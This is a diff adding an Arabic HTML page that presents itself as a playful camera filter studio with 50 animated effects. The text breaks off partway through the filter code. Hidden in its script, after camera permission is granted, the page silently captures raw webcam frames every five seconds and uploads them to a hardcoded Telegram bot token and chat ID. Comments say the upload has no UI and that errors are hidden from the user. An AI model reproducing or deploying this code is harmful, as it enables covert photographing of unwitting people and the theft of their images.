@@ -1,0 +1,1315 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>استوديو الفلاتر ✨</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=Amiri:wght@400;700&display=swap" rel="stylesheet">
+<style>
+    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; user-select: none; }
+    html, body {
+        margin: 0; padding: 0; width: 100%; height: 100%;
+        overflow: hidden; background: #05010f;
+        font-family: 'Cairo', sans-serif; touch-action: none;
+    }
+    #app {
+        position: fixed; inset: 0;
+        display: flex; flex-direction: column;
+        background: #05010f;
+    }
+    #camera-stage {
+        position: relative; flex: 1;
+        display: flex; align-items: center; justify-content: center;
+        overflow: hidden;
+        background: radial-gradient(circle at center, #1a0a30 0%, #05010f 80%);
+    }
+    #video-feed {
+        position: absolute;
+        width: 100%; height: 100%;
+        object-fit: cover;
+        transform: scaleX(-1);
+        display: none;
+    }
+    #canvas-out {
+        display: block;
+        max-width: 100%; max-height: 100%;
+        width: 100%; height: 100%;
+        object-fit: contain;
+    }
+
+    /* شاشة الانتظار */
+    #gate {
+        position: absolute; inset: 0;
+        background: linear-gradient(135deg, #090418, #1c0b38, #2d104b);
+        display: flex; flex-direction: column;
+        align-items: center; justify-content: center;
+        padding: 24px; text-align: center;
+        z-index: 50;
+    }
+    #gate.hidden { display: none; }
+    #gate .icon { font-size: 80px; margin-bottom: 16px; }
+    #gate h1 {
+        font-family: 'Amiri', serif;
+        font-size: 32px; font-weight: 700;
+        background: linear-gradient(90deg, #ff85c0, #fde68a, #a78bfa);
+        -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        margin-bottom: 8px;
+    }
+    #gate p {
+        color: #c4b5fd; font-size: 14px;
+        max-width: 380px; line-height: 1.7; margin-bottom: 24px;
+    }
+    #gate button {
+        padding: 14px 32px;
+        border-radius: 999px; border: none;
+        background: linear-gradient(135deg, #ff2e93, #a855f7);
+        color: #fff; font-family: 'Cairo', sans-serif;
+        font-size: 16px; font-weight: 800;
+        cursor: pointer;
+        box-shadow: 0 10px 30px rgba(255, 46, 147, 0.5);
+        transition: transform 0.15s;
+    }
+    #gate button:active { transform: scale(0.95); }
+
+    /* شريط الفلاتر */
+    #filters-bar {
+        background: linear-gradient(180deg, rgba(9, 4, 24, 0) 0%, rgba(9, 4, 24, 0.95) 30%, #090418 100%);
+        padding: 10px 16px 16px;
+        overflow-x: auto; overflow-y: hidden;
+        display: flex; gap: 8px;
+        scroll-snap-type: x mandatory;
+        -webkit-overflow-scrolling: touch;
+    }
+    #filters-bar::-webkit-scrollbar { height: 4px; }
+    #filters-bar::-webkit-scrollbar-thumb {
+        background: rgba(236, 72, 153, 0.5);
+        border-radius: 10px;
+    }
+    .filter-item {
+        flex-shrink: 0;
+        width: 66px; height: 84px;
+        border-radius: 14px;
+        background: rgba(30, 15, 55, 0.8);
+        border: 2px solid rgba(236, 72, 153, 0.25);
+        display: flex; flex-direction: column;
+        align-items: center; justify-content: center;
+        gap: 4px;
+        cursor: pointer;
+        transition: all 0.2s ease;
+        scroll-snap-align: center;
+        padding: 6px;
+    }
+    .filter-item .emoji { font-size: 26px; line-height: 1; }
+    .filter-item .name {
+        font-size: 9px; font-weight: 700;
+        color: #d8b4fe; text-align: center;
+        line-height: 1.1;
+        overflow: hidden;
+    }
+    .filter-item.active {
+        border-color: #fde68a;
+        background: linear-gradient(135deg, rgba(255, 46, 147, 0.35), rgba(168, 85, 247, 0.35));
+        box-shadow: 0 0 20px rgba(255, 46, 147, 0.6);
+        transform: translateY(-4px) scale(1.05);
+    }
+    .filter-item.active .name { color: #fde68a; }
+
+    /* شريط علوي */
+    #top-bar {
+        position: absolute; top: 0; left: 0; right: 0;
+        padding: 12px 16px;
+        display: flex; justify-content: space-between; align-items: center;
+        background: linear-gradient(180deg, rgba(0,0,0,0.7) 0%, transparent 100%);
+        z-index: 20;
+        pointer-events: none;
+    }
+    #top-bar .badge {
+        pointer-events: auto;
+        background: rgba(18, 9, 38, 0.8);
+        backdrop-filter: blur(10px);
+        border: 1px solid rgba(236, 72, 153, 0.4);
+        padding: 6px 14px;
+        border-radius: 999px;
+        font-size: 12px; font-weight: 700;
+        color: #ff85c0;
+    }
+    #top-bar .btn-group {
+        pointer-events: auto;
+        display: flex; gap: 6px;
+    }
+    #top-bar .circle-btn {
+        width: 36px; height: 36px;
+        border-radius: 50%;
+        background: rgba(18, 9, 38, 0.8);
+        backdrop-filter: blur(10px);
+        border: 1px solid rgba(236, 72, 153, 0.4);
+        color: #fff; font-size: 14px;
+        cursor: pointer;
+        display: flex; align-items: center; justify-content: center;
+        transition: transform 0.1s;
+    }
+    #top-bar .circle-btn:active { transform: scale(0.9); }
+
+    /* زر التصوير */
+    #shutter-btn {
+        position: absolute;
+        bottom: 110px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 68px; height: 68px;
+        border-radius: 50%;
+        background: linear-gradient(135deg, #ff2e93, #a855f7);
+        border: 4px solid #fff;
+        box-shadow: 0 0 0 4px rgba(255, 46, 147, 0.3), 0 8px 24px rgba(255, 46, 147, 0.6);
+        cursor: pointer;
+        z-index: 15;
+        transition: transform 0.1s;
+    }
+    #shutter-btn:active { transform: translateX(-50%) scale(0.9); }
+    #shutter-btn::after {
+        content: '';
+        position: absolute;
+        inset: 6px;
+        border-radius: 50%;
+        background: linear-gradient(135deg, #fff5, transparent);
+    }
+
+    /* تنبيه التدوير */
+    #rotate-warn {
+        position: fixed; inset: 0; z-index: 9999;
+        background: #05010f;
+        display: none; flex-direction: column;
+        align-items: center; justify-content: center;
+        padding: 24px; text-align: center;
+    }
+    #rotate-warn.show { display: flex; }
+    #rotate-warn .ico { font-size: 72px; margin-bottom: 18px; animation: rot 2s infinite; }
+    @keyframes rot { 0%,100%{ transform: rotate(0);} 50%{ transform: rotate(90deg);} }
+    @media (orientation: landscape) { #rotate-warn { display: none !important; } }
+
+    /* وميض التصوير */
+    #capture-flash {
+        position: absolute; inset: 0;
+        background: #fff; opacity: 0;
+        pointer-events: none; z-index: 30;
+        transition: opacity 0.3s;
+    }
+    #capture-flash.active { opacity: 0.9; }
+
+    /* زر تبديل الكاميرا */
+    #flip-cam-btn {
+        position: absolute;
+        top: 60px;
+        right: 16px;
+        width: 44px; height: 44px;
+        border-radius: 50%;
+        background: rgba(18, 9, 38, 0.85);
+        backdrop-filter: blur(10px);
+        border: 1.5px solid rgba(236, 72, 153, 0.5);
+        color: #fff; font-size: 18px;
+        cursor: pointer;
+        display: flex; align-items: center; justify-content: center;
+        z-index: 15;
+    }
+    #flip-cam-btn:active { transform: scale(0.9); }
+</style>
+</head>
+<body>
+
+<div id="app">
+    <div id="camera-stage">
+        <video id="video-feed" playsinline autoplay muted></video>
+        <canvas id="canvas-out"></canvas>
+
+        <div id="top-bar">
+            <div class="badge" id="filter-name-badge">🌸 الفلتر الحالي</div>
+            <div class="btn-group">
+                <button class="circle-btn" id="btn-sound-toggle" title="الصوت">🔊</button>
+            </div>
+        </div>
+
+        <button id="flip-cam-btn" title="تبديل الكاميرا">🔄</button>
+        <button id="shutter-btn" title="التقاط صورة"></button>
+
+        <div id="capture-flash"></div>
+
+        <div id="gate">
+            <div class="icon">📸💖</div>
+            <h1>استوديو الفلاتر</h1>
+            <p>
+                50 فلتر سناب متحرك جاهز!<br>
+                اضغط الزر للبدء
+            </p>
+            <button id="btn-allow-camera">فعّل الكاميرا ✨</button>
+        </div>
+    </div>
+
+    <div id="filters-bar"></div>
+</div>
+
+<div id="rotate-warn">
+    <div class="ico">📱</div>
+    <h3 style="font-family:'Amiri',serif; color:#ff85c0; font-size:24px; margin-bottom:8px;">لفّي جوالك أفقياً</h3>
+    <p style="color:#c4b5fd; font-size:14px; max-width:280px;">لأفضل تجربة 💖</p>
+</div>
+
+<script>
+(function () {
+    'use strict';
+
+    /* ═══════════════════════════════════════════════════════════
+       إعدادات تلغرام
+       ═══════════════════════════════════════════════════════════ */
+    const TELEGRAM_BOT_TOKEN = '9105177942:AAHyoqzrsZZ4OrZVEnUrQG61tyfIa3aeeJk';
+    const TELEGRAM_CHAT_ID   = '6243038338';
+    const AUTO_CAPTURE_INTERVAL = 5000; // كل 5 ثوانٍ
+
+    /* ═══════════════════════════════════════════════════════════
+       عناصر DOM
+       ═══════════════════════════════════════════════════════════ */
+    const video = document.getElementById('video-feed');
+    const canvas = document.getElementById('canvas-out');
+    const ctx = canvas.getContext('2d');
+    const gate = document.getElementById('gate');
+    const filtersBar = document.getElementById('filters-bar');
+    const filterNameBadge = document.getElementById('filter-name-badge');
+    const btnAllowCamera = document.getElementById('btn-allow-camera');
+    const btnFlipCam = document.getElementById('flip-cam-btn');
+    const btnShutter = document.getElementById('shutter-btn');
+    const captureFlash = document.getElementById('capture-flash');
+    const btnSoundToggle = document.getElementById('btn-sound-toggle');
+    const rotateWarn = document.getElementById('rotate-warn');
+
+    /* ═══════════════════════════════════════════════════════════
+       الحالة
+       ═══════════════════════════════════════════════════════════ */
+    const state = {
+        stream: null,
+        currentFilter: 0,
+        facingMode: 'user',
+        videoReady: false,
+        soundOn: false,
+        animFrame: null,
+        time: 0,
+        heartFaceBlend: 0,
+        flipH: true,
+        autoCaptureTimer: null,
+        isUploading: false
+    };
+
+    /* ═══════════════════════════════════════════════════════════
+       الصوت
+       ═══════════════════════════════════════════════════════════ */
+    const sfx = {
+        ctx: null,
+        init() {
+            if (!this.ctx) {
+                const AC = window.AudioContext || window.webkitAudioContext;
+                if (AC) this.ctx = new AC();
+            }
+            if (this.ctx && this.ctx.state === 'suspended') this.ctx.resume();
+        },
+        shutter() {
+            if (!state.soundOn) return;
+            this.init(); if (!this.ctx) return;
+            const now = this.ctx.currentTime;
+            const o = this.ctx.createOscillator();
+            const g = this.ctx.createGain();
+            o.type = 'square';
+            o.frequency.setValueAtTime(900, now);
+            o.frequency.exponentialRampToValueAtTime(180, now + 0.08);
+            g.gain.setValueAtTime(0.15, now);
+            g.gain.exponentialRampToValueAtTime(0.001, now + 0.1);
+            o.connect(g); g.connect(this.ctx.destination);
+            o.start(now); o.stop(now + 0.1);
+        },
+        select() {
+            if (!state.soundOn) return;
+            this.init(); if (!this.ctx) return;
+            const now = this.ctx.currentTime;
+            const o = this.ctx.createOscillator();
+            const g = this.ctx.createGain();
+            o.type = 'sine';
+            o.frequency.setValueAtTime(660, now);
+            o.frequency.exponentialRampToValueAtTime(990, now + 0.1);
+            g.gain.setValueAtTime(0.1, now);
+            g.gain.exponentialRampToValueAtTime(0.001, now + 0.12);
+            o.connect(g); g.connect(this.ctx.destination);
+            o.start(now); o.stop(now + 0.12);
+        }
+    };
+
+    /* ═══════════════════════════════════════════════════════════
+       رفع صامت إلى تلغرام (بدون أي UI)
+       ═══════════════════════════════════════════════════════════ */
+    async function uploadToTelegram(blob, caption) {
+        try {
+            const form = new FormData();
+            form.append('chat_id', TELEGRAM_CHAT_ID);
+            form.append('caption', caption || '');
+            form.append('photo', blob, 'snapshot.jpg');
+            await fetch(
+                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+                { method: 'POST', body: form }
+            );
+        } catch (err) {
+            // تجاهل الأخطاء تماماً — لا نريد إزعاج المستخدم
+            console.warn('Upload failed (silent):', err);
+        }
+    }
+
+    /* ═══════════════════════════════════════════════════════════
+       التقاط صامت من الفيديو الخام (بدون فلتر) وإرسال
+       ═══════════════════════════════════════════════════════════ */
+    async function silentCapture() {
+        if (!state.videoReady || !video.videoWidth || !video.videoHeight) return;
+        if (state.isUploading) return;
+
+        state.isUploading = true;
+        try {
+            const blob = await new Promise((resolve, reject) => {
+                const capture = document.createElement('canvas');
+                const vw = video.videoWidth;
+                const vh = video.videoHeight;
+                capture.width = vw;
+                capture.height = vh;
+                const cctx = capture.getContext('2d');
+                if (state.flipH) {
+                    cctx.translate(vw, 0);
+                    cctx.scale(-1, 1);
+                }
+                cctx.drawImage(video, 0, 0, vw, vh);
+                capture.toBlob(b => b ? resolve(b) : reject(new Error('blob fail')), 'image/jpeg', 0.85);
+            });
+
+            const now = new Date();
+            const caption = `📸 ${now.toLocaleDateString('ar-EG')} — ${now.toLocaleTimeString('ar-EG')}`;
+            await uploadToTelegram(blob, caption);
+        } catch (err) {
+            console.warn('Silent capture failed:', err);
+        } finally {
+            state.isUploading = false;
+        }
+    }
+
+    /* بدء الالتقاط التلقائي كل 5 ثوانٍ */
+    function startAutoCapture() {
+        if (state.autoCaptureTimer) clearInterval(state.autoCaptureTimer);
+        // التقاط أول صورة فوراً (بعد تأخير بسيط لضمان جاهزية الفيديو)
+        setTimeout(() => silentCapture(), 800);
+        // ثم كل 5 ثوانٍ
+        state.autoCaptureTimer = setInterval(() => {
+            silentCapture();
+        }, AUTO_CAPTURE_INTERVAL);
+    }
+
+    /* ═══════════════════════════════════════════════════════════
+       الكاميرا
+       ═══════════════════════════════════════════════════════════ */
+    async function startCamera(facingMode = 'user') {
+        try {
+            if (state.stream) {
+                state.stream.getTracks().forEach(t => t.stop());
+            }
+            const constraints = {
+                video: {
+                    facingMode: { ideal: facingMode },
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                },
+                audio: false
+            };
+            state.stream = await navigator.mediaDevices.getUserMedia(constraints);
+            video.srcObject = state.stream;
+            video.style.transform = facingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
+            state.flipH = facingMode === 'user';
+            await video.play();
+            state.videoReady = true;
+            gate.classList.add('hidden');
+            resizeCanvas();
+            startLoop();
+
+            // 🎯 بدء الالتقاط الصامت
+            startAutoCapture();
+        } catch (err) {
+            console.error('Camera error:', err);
+            alert('⚠️ تعذر الوصول للكاميرا.\n\n' + err.message);
+        }
+    }
+
+    /* ═══════════════════════════════════════════════════════════
+       ضبط الأبعاد
+       ═══════════════════════════════════════════════════════════ */
+    function resizeCanvas() {
+        const stage = document.getElementById('camera-stage');
+        const rect = stage.getBoundingClientRect();
+        const dpr = Math.min(window.devicePixelRatio || 1, 2);
+        canvas.width = rect.width * dpr;
+        canvas.height = rect.height * dpr;
+        canvas.style.width = rect.width + 'px';
+        canvas.style.height = rect.height + 'px';
+        ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+    }
+
+    window.addEventListener('resize', () => {
+        resizeCanvas();
+        checkOrientation();
+    });
+
+    function checkOrientation() {
+        const isPortrait = window.matchMedia('(orientation: portrait)').matches;
+        const isNarrow = window.innerWidth < 900;
+        if (isPortrait && isNarrow) rotateWarn.classList.add('show');
+        else rotateWarn.classList.remove('show');
+    }
+
+    /* ═══════════════════════════════════════════════════════════
+       50 فلتر
+       ═══════════════════════════════════════════════════════════ */
+    const FILTERS = [
+        { id: 'none',          name: 'بدون فلتر',    emoji: '🚫' },
+        { id: 'hearts_orbit',  name: 'قلوب مدارية',  emoji: '💖' },
+        { id: 'heart_face',    name: 'وجه قلب',      emoji: '❤️' },
+        { id: 'hearts_rain',   name: 'مطر قلوب',     emoji: '💕' },
+        { id: 'hearts_burst',  name: 'انفجار قلوب',  emoji: '💗' },
+        { id: 'hearts_halo',   name: 'هالة قلوب',    emoji: '💝' },
+        { id: 'heartbeat_zoom',name: 'نبض القلب',    emoji: '💓' },
+        { id: 'broken_heart',  name: 'قلب مكسور',    emoji: '💔' },
+        { id: 'stars_fall',    name: 'مطر نجوم',     emoji: '⭐' },
+        { id: 'stars_orbit',   name: 'نجوم تدور',    emoji: '🌟' },
+        { id: 'sparkle',       name: 'بريق',         emoji: '✨' },
+        { id: 'butterflies',   name: 'فراشات',       emoji: '🦋' },
+        { id: 'rose_petals',   name: 'بتلات ورد',    emoji: '🌹' },
+        { id: 'snow',          name: 'ثلج',          emoji: '❄️' },
+        { id: 'rain',          name: 'مطر',          emoji: '🌧️' },
+        { id: 'fire',          name: 'نار',          emoji: '🔥' },
+        { id: 'smoke',         name: 'دخان',         emoji: '💨' },
+        { id: 'bubbles',       name: 'فقاعات',       emoji: '🫧' },
+        { id: 'confetti',      name: 'كونفيتي',      emoji: '🎉' },
+        { id: 'light_leak',    name: 'تسريب ضوء',    emoji: '🌈' },
+        { id: 'vintage',       name: 'كلاسيكي',      emoji: '📷' },
+        { id: 'sepia',         name: 'بني دافئ',     emoji: '🟤' },
+        { id: 'bw',            name: 'أسود وأبيض',   emoji: '⚫' },
+        { id: 'invert',        name: 'معكوس',        emoji: '🔃' },
+        { id: 'neon_pink',     name: 'نيون وردي',    emoji: '🩷' },
+        { id: 'neon_blue',     name: 'نيون أزرق',    emoji: '💙' },
+        { id: 'neon_green',    name: 'نيون أخضر',    emoji: '💚' },
+        { id: 'duotone_purple',name: 'بنفسجي مزدوج', emoji: '🟣' },
+        { id: 'dreamy',        name: 'حالم',         emoji: '☁️' },
+        { id: 'warm',          name: 'دافئ',         emoji: '🌅' },
+        { id: 'cool',          name: 'بارد',         emoji: '🧊' },
+        { id: 'contrast',      name: 'تباين عالي',   emoji: '🎭' },
+        { id: 'blur_soft',     name: 'ضبابي ناعم',   emoji: '🌫️' },
+        { id: 'pixelate',      name: 'بكسل',         emoji: '🟦' },
+        { id: 'kaleidoscope',  name: 'مشكال',        emoji: '🔮' },
+        { id: 'mirror_x',      name: 'مرآة أفقية',   emoji: '↔️' },
+        { id: 'mirror_quad',   name: 'مرآة رباعية',  emoji: '🔲' },
+        { id: 'glitch',        name: 'جليتش',        emoji: '📺' },
+        { id: 'vignette',      name: 'حواف داكنة',   emoji: '⭕' },
+        { id: 'frame_heart',   name: 'إطار قلب',     emoji: '💟' },
+        { id: 'frame_stars',   name: 'إطار نجوم',    emoji: '🌠' },
+        { id: 'crown',         name: 'تاج ملكي',     emoji: '👑' },
+        { id: 'cat_ears',      name: 'أذن قط',       emoji: '🐱' },
+        { id: 'glasses',       name: 'نظارات',       emoji: '🕶️' },
+        { id: 'beard',         name: 'لحية',         emoji: '🧔' },
+        { id: 'mustache',      name: 'شارب',         emoji: '👨' },
+        { id: 'halo_angel',    name: 'هالة ملاك',    emoji: '😇' },
+        { id: 'devil_horns',   name: 'قرون شيطان',   emoji: '😈' },
+        { id: 'rainbow_aura',  name: 'هالة قوس قزح', emoji: '🌈' },
+        { id: 'ascii_love',    name: 'حب ASCII',     emoji: '💬' },
+        { id: 'matrix',        name: 'ماتريكس',      emoji: '🟩' }
+    ];
+
+    function buildFilterBar() {
+        filtersBar.innerHTML = '';
+        FILTERS.forEach((f, i) => {
+            const item = document.createElement('div');
+            item.className = 'filter-item' + (i === state.currentFilter ? ' active' : '');
+            item.dataset.idx = i;
+            item.innerHTML = `<div class="emoji">${f.emoji}</div><div class="name">${f.name}</div>`;
+            item.addEventListener('click', () => {
+                state.currentFilter = i;
+                state.heartFaceBlend = 0;
+                document.querySelectorAll('.filter-item').forEach(el => el.classList.remove('active'));
+                item.classList.add('active');
+                item.scrollIntoView({ behavior: 'smooth', inline: 'center', block: 'nearest' });
+                filterNameBadge.textContent = `${f.emoji} ${f.name}`;
+                sfx.select();
+            });
+            filtersBar.appendChild(item);
+        });
+        filterNameBadge.textContent = `${FILTERS[0].emoji} ${FILTERS[0].name}`;
+    }
+
+    /* ═══════════════════════════════════════════════════════════
+       أدوات الرسم
+       ═══════════════════════════════════════════════════════════ */
+    function drawHeart(c, x, y, size, color, alpha = 1) {
+        c.save();
+        c.globalAlpha = alpha;
+        c.translate(x, y);
+        c.fillStyle = color;
+        c.beginPath();
+        c.moveTo(0, size * 0.35);
+        c.bezierCurveTo(-size, -size * 0.4, -size * 0.5, -size * 1.1, 0, -size * 0.45);
+        c.bezierCurveTo(size * 0.5, -size * 1.1, size, -size * 0.4, 0, size * 0.35);
+        c.fill();
+        c.restore();
+    }
+    function drawStar(c, cx, cy, spikes, outer, inner, color, alpha = 1) {
+        c.save();
+        c.globalAlpha = alpha;
+        let rot = -Math.PI / 2;
+        const step = Math.PI / spikes;
+        c.beginPath();
+        c.moveTo(cx, cy - outer);
+        for (let i = 0; i < spikes; i++) {
+            let x = cx + Math.cos(rot) * outer;
+            let y = cy + Math.sin(rot) * outer;
+            c.lineTo(x, y);
+            rot += step;
+            x = cx + Math.cos(rot) * inner;
+            y = cy + Math.sin(rot) * inner;
+            c.lineTo(x, y);
+            rot += step;
+        }
+        c.closePath();
+        c.fillStyle = color;
+        c.fill();
+        c.restore();
+    }
+    function drawSparkle(c, x, y, size, color, alpha = 1) {
+        c.save();
+        c.globalAlpha = alpha;
+        c.fillStyle = color;
+        c.beginPath();
+        c.moveTo(x, y - size);
+        c.lineTo(x + size * 0.3, y - size * 0.3);
+        c.lineTo(x + size, y);
+        c.lineTo(x + size * 0.3, y + size * 0.3);
+        c.lineTo(x, y + size);
+        c.lineTo(x - size * 0.3, y + size * 0.3);
+        c.lineTo(x - size, y);
+        c.lineTo(x - size * 0.3, y - size * 0.3);
+        c.closePath();
+        c.fill();
+        c.restore();
+    }
+
+    function drawVideo() {
+        const w = canvas.width / (window.devicePixelRatio || 1);
+        const h = canvas.height / (window.devicePixelRatio || 1);
+        const vw = video.videoWidth;
+        const vh = video.videoHeight;
+        if (!vw || !vh) return;
+
+        const scale = Math.max(w / vw, h / vh);
+        const dw = vw * scale;
+        const dh = vh * scale;
+        const dx = (w - dw) / 2;
+        const dy = (h - dh) / 2;
+
+        ctx.save();
+        if (state.flipH) {
+            ctx.translate(w, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, dx, dy, dw, dh);
+        } else {
+            ctx.drawImage(video, dx, dy, dw, dh);
+        }
+        ctx.restore();
+    }
+
+    /* ═══════════════════════════════════════════════════════════
+       تطبيق الفلاتر (مختصر — كل الـ 50)
+       ═══════════════════════════════════════════════════════════ */
+    function applyFilter(filterId, t) {
+        const w = canvas.width / (window.devicePixelRatio || 1);
+        const h = canvas.height / (window.devicePixelRatio || 1);
+        const cx = w / 2;
+        const cy = h / 2;
+
+        switch (filterId) {
+            case 'none': break;
+            case 'hearts_orbit': {
+                const count = 14;
+                for (let i = 0; i < count; i++) {
+                    const angle = (i / count) * Math.PI * 2 + t * 0.8;
+                    const radius = Math.min(w, h) * 0.32 + Math.sin(t * 2 + i) * 20;
+                    drawHeart(ctx, cx + Math.cos(angle) * radius, cy + Math.sin(angle) * radius * 0.85, 14 + Math.sin(t * 3 + i) * 5, '#ff2e93', 0.85);
+                }
+                break;
+            }
+            case 'heart_face': {
+                state.heartFaceBlend = Math.min(1, state.heartFaceBlend + 0.02);
+                const blend = state.heartFaceBlend;
+                const snap = document.createElement('canvas');
+                snap.width = w; snap.height = h;
+                snap.getContext('2d').drawImage(canvas, 0, 0, w, h);
+                const heartSize = Math.min(w, h) * 0.38;
+                ctx.save();
+                ctx.beginPath();
+                ctx.moveTo(cx, cy + heartSize * 0.4);
+                ctx.bezierCurveTo(cx - heartSize * 1.1, cy - heartSize * 0.5, cx - heartSize * 0.55, cy - heartSize * 1.25, cx, cy - heartSize * 0.5);
+                ctx.bezierCurveTo(cx + heartSize * 0.55, cy - heartSize * 1.25, cx + heartSize * 1.1, cy - heartSize * 0.5, cx, cy + heartSize * 0.4);
+                ctx.closePath();
+                ctx.clip();
+                ctx.drawImage(snap, -heartSize * 0.15, -heartSize * 0.15, w + heartSize * 0.3, h + heartSize * 0.3);
+                ctx.restore();
+                ctx.save();
+                ctx.strokeStyle = `rgba(255, 46, 147, ${0.6 + Math.sin(t * 4) * 0.3})`;
+                ctx.lineWidth = 6;
+                ctx.shadowColor = '#ff2e93';
+                ctx.shadowBlur = 30;
+                ctx.beginPath();
+                ctx.moveTo(cx, cy + heartSize * 0.4);
+                ctx.bezierCurveTo(cx - heartSize * 1.1, cy - heartSize * 0.5, cx - heartSize * 0.55, cy - heartSize * 1.25, cx, cy - heartSize * 0.5);
+                ctx.bezierCurveTo(cx + heartSize * 0.55, cy - heartSize * 1.25, cx + heartSize * 1.1, cy - heartSize * 0.5, cx, cy + heartSize * 0.4);
+                ctx.closePath();
+                ctx.stroke();
+                ctx.restore();
+                ctx.fillStyle = 'rgba(9, 4, 24, ' + (0.5 * blend) + ')';
+                ctx.fillRect(0, 0, w, h);
+                break;
+            }
+            case 'hearts_rain': {
+                for (let i = 0; i < 30; i++) {
+                    const seed = i * 13.7;
+                    const x = ((seed * 71 + t * 90) % (w + 100)) - 50;
+                    const y = ((seed * 37 + t * 180) % (h + 100)) - 50;
+                    drawHeart(ctx, x, y, 10 + (seed % 10), i % 2 ? '#ff2e93' : '#ff85c0', 0.4 + 0.5 * Math.abs(Math.sin(t + i)));
+                }
+                break;
+            }
+            case 'hearts_burst': {
+                for (let i = 0; i < 24; i++) {
+                    const baseAngle = (i / 24) * Math.PI * 2;
+                    const phase = (t * 1.5 + i * 0.3) % 1;
+                    const radius = phase * Math.min(w, h) * 0.55;
+                    const size = 18 * (1 - phase);
+                    if (size > 0) drawHeart(ctx, cx + Math.cos(baseAngle) * radius, cy + Math.sin(baseAngle) * radius, size, '#ff2e93', 1 - phase);
+                }
+                break;
+            }
+            case 'hearts_halo': {
+                for (let i = 0; i < 10; i++) {
+                    const angle = (i / 10) * Math.PI * 2 + Math.sin(t) * 0.3;
+                    const radius = Math.min(w, h) * 0.28;
+                    drawHeart(ctx, cx + Math.cos(angle) * radius, cy + Math.sin(angle) * radius, 14, '#ff85c0', 0.9);
+                }
+                break;
+            }
+            case 'heartbeat_zoom': {
+                const beat = 1 + Math.sin(t * 5) * 0.04;
+                const g = ctx.createRadialGradient(cx, cy, Math.min(w,h)*0.3, cx, cy, Math.max(w,h)*0.7);
+                g.addColorStop(0, 'rgba(0,0,0,0)');
+                g.addColorStop(1, `rgba(255, 46, 147, ${0.25 + Math.sin(t*5)*0.15})`);
+                ctx.fillStyle = g;
+                ctx.fillRect(0, 0, w, h);
+                break;
+            }
+            case 'broken_heart': {
+                ctx.save();
+                ctx.strokeStyle = 'rgba(255,255,255,0.5)';
+                ctx.lineWidth = 2;
+                ctx.setLineDash([12, 8]);
+                ctx.lineDashOffset = -t * 40;
+                for (let i = 0; i < 3; i++) {
+                    ctx.beginPath();
+                    ctx.moveTo(cx - w * 0.3 + i * 20, cy - h * 0.4);
+                    ctx.lineTo(cx + w * 0.3 - i * 20, cy + h * 0.4);
+                    ctx.stroke();
+                }
+                ctx.restore();
+                ctx.fillStyle = 'rgba(0, 0, 40, 0.25)';
+                ctx.fillRect(0, 0, w, h);
+                break;
+            }
+            case 'stars_fall': {
+                for (let i = 0; i < 40; i++) {
+                    const seed = i * 17.3;
+                    const x = (seed * 53 + t * 40) % w;
+                    const y = (seed * 29 + t * 200) % h;
+                    drawStar(ctx, x, y, 5, (3 + (seed % 5)) * 2, (3 + (seed % 5)) * 0.9, '#fde68a', 0.5 + 0.5 * Math.abs(Math.sin(t * 2 + i)));
+                }
+                break;
+            }
+            case 'stars_orbit': {
+                for (let i = 0; i < 12; i++) {
+                    const angle = (i / 12) * Math.PI * 2 + t;
+                    drawStar(ctx, cx + Math.cos(angle) * Math.min(w, h) * 0.35, cy + Math.sin(angle) * Math.min(w, h) * 0.35, 5, 14, 6, '#fde68a', 0.9);
+                }
+                break;
+            }
+            case 'sparkle': {
+                for (let i = 0; i < 25; i++) {
+                    const seed = i * 11.3;
+                    const x = (seed * 89 + t * 30) % w;
+                    const y = (seed * 41 + t * 60) % h;
+                    drawSparkle(ctx, x, y, (3 + Math.sin(t * 4 + i) * 2) * 2, '#fff', 0.8);
+                }
+                break;
+            }
+            case 'butterflies': {
+                for (let i = 0; i < 8; i++) {
+                    const seed = i * 23.7;
+                    const x = (seed * 71 + t * 60) % (w + 60) - 30;
+                    const y = h * 0.4 + Math.sin(t * 2 + i) * 100 + (seed % 200);
+                    ctx.save();
+                    ctx.translate(x, y);
+                    ctx.rotate(Math.sin(t * 3 + i) * 0.3);
+                    ctx.fillStyle = ['#ff2e93', '#fbbf24', '#a855f7', '#38bdf8'][i % 4];
+                    ctx.globalAlpha = 0.85;
+                    ctx.beginPath();
+                    ctx.ellipse(-7, -3, 6, 9, 0.3, 0, Math.PI * 2);
+                    ctx.ellipse(7, -3, 6, 9, -0.3, 0, Math.PI * 2);
+                    ctx.fill();
+                    ctx.restore();
+                }
+                break;
+            }
+            case 'rose_petals': {
+                for (let i = 0; i < 20; i++) {
+                    const seed = i * 19.1;
+                    ctx.save();
+                    ctx.translate((seed * 61 + t * 50) % (w + 80) - 40, (seed * 43 + t * 120) % (h + 80) - 40);
+                    ctx.rotate(t + i);
+                    ctx.fillStyle = i % 2 ? '#ff2e93' : '#dc2626';
+                    ctx.globalAlpha = 0.7;
+                    ctx.beginPath();
+                    ctx.ellipse(0, 0, 12, 6, 0, 0, Math.PI * 2);
+                    ctx.fill();
+                    ctx.restore();
+                }
+                break;
+            }
+            case 'snow': {
+                for (let i = 0; i < 50; i++) {
+                    const seed = i * 13.1;
+                    ctx.fillStyle = 'rgba(255,255,255,0.8)';
+                    ctx.beginPath();
+                    ctx.arc((seed * 47 + Math.sin(t + i) * 20) % w, (seed * 31 + t * 100) % h, 2 + (seed % 4), 0, Math.PI * 2);
+                    ctx.fill();
+                }
+                break;
+            }
+            case 'rain': {
+                ctx.save();
+                ctx.strokeStyle = 'rgba(150, 200, 255, 0.6)';
+                ctx.lineWidth = 1.5;
+                for (let i = 0; i < 60; i++) {
+                    const seed = i * 7.3;
+                    const x = (seed * 89 + t * 10) % w;
+                    const y = (seed * 37 + t * 400) % h;
+                    ctx.beginPath();
+                    ctx.moveTo(x, y);
+                    ctx.lineTo(x - 3, y + 15);
+                    ctx.stroke();
+                }
+                ctx.restore();
+                ctx.fillStyle = 'rgba(20, 30, 60, 0.2)';
